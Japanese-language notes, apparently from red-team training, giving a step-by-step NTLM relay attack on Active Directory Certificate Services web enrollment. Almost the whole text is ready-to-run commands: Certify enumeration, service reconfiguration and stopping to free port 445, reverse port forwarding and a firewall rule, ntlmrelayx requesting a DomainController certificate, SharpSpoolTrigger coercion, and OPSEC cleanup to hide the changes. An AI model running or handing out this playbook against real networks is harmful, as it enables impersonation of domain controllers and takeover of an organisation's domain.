NTLM認証をADCSのHTTP証明書登録エンドポイントに中継されることで、攻撃者が別のユーザ・コンピュータとして証明書を取得可能

典型的なエンドポイント
```
http[s]://<ca>/certsrv/
```

![](images/Pasted%20image%2020260518145548.png)


## Enumeration
`enum-cas`を使用する
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
```

## Attack Flow
Windowsでは445ポートは既にバインドされてるので制御が難しい。
攻撃手順は以下となる
1. 侵害マシン上で445バインド解除(lnmanserver, srv2, srvnetの順でサービス停止)
2. 445でリバースポートフォワーディングし、NTLM認証要求を攻撃のマシンまでトンネリング
3. 攻撃者マシン上でntlmrelayxを実行し、リバースポートフォワーディングからのNTLM認証要求を補足
4. ntlmrelayx用のSOCKSプロキシを実行して、中継リクエストをADCSのエンドポイントへ転送

netstat BOFでバインドを確認
```
netstat
```

lanmanserverはstart modeを変更する必要あり（AUTO_START->DEMAND_START)
```
sc_config lanmanserver "C:\Windows\System32\svchost.exe -k netsvcs -p" 1 4
```

各サービス停止
```
sc_stop lanmanserver
sc_stop srv2
sc_stop srvnet
```

445を7445にリバースポートフォワード
```
rportfwd_local 445 localhost 7445
```

再確認
```
netstat
```

> [!WARNING]
> 

ファイアウォールでインバウンド445を許可
```
powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
```

アタッカー側でkali起動
```
docker container start -i kali-1
```

proxychains設定で以下を追加`vim /etc/proxychains.conf`
```
socks5 10.0.0.5 1080
```

ntlmrelayx
```
proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

強制認証させる
```
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
```

pdxがディレクトリに書き込まれるのでpfxを悪用する

## OPSEC戻し
```
socks stop
rportfwd stop 445
```

```
sc_config lanmanserver "C:\Windows\System32\svchost.exe -k netsvcs -p" 1 2
```

```
sc_start srvnet
sc_start srv2
sc_start lanmanserver
```

戻ってるか確認
```
netstat
```

ファイアウォール削除
```
powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
```